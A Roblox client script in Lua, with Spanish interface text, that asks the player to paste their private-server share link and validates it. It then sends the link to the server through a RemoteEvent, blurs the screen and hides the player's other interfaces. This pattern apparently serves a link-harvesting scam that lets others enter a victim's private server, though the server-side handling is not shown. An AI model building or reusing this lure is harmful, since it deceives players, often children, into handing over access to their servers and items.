--// LOCAL SCRIPT \\--
local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")

-- ====== CREAR UI ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ServerLinkUI"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.BackgroundTransparency = 1
Label.TextScaled = true

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="
TextBox.TextScaled = true

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
MessageLabel.TextScaled = true

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true

-- ====== FUNCIONES ======
local function isLinkValid(link)
	local startPart = "https://www.roblox.com/share?code="
	local endPart = "&type=Server"
	return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

local function freezeEnvironment()
	-- Añadir un efecto visual en lugar de modificar el Workspace
	local blur = Instance.new("BlurEffect")
	blur.Size = 24
	blur.Name = "FreezeBlur"
	blur.Parent = Lighting
end

-- ====== EVENTO DEL BOTÓN ======
Button.MouseButton1Click:Connect(function()
	local link = TextBox.Text

	if isLinkValid(link) then
		MessageLabel.Text = "El link es válido ✅"
		MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

		local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
		if remoteEvent then
			remoteEvent:FireServer(link)
		end

		freezeEnvironment()

		-- Ocultar otras GUIs del jugador
		for _, gui in pairs(Player.PlayerGui:GetChildren()) do
			if gui:IsA("ScreenGui") and gui.Name ~= "RobloxGui" and gui ~= ScreenGui then
				gui.Enabled = false
			end
		end

		-- Destruir esta UI después de unos segundos
		task.wait(1)
		ScreenGui:Destroy()

	else
		MessageLabel.Text = "El link es inválido ❌"
		MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end)

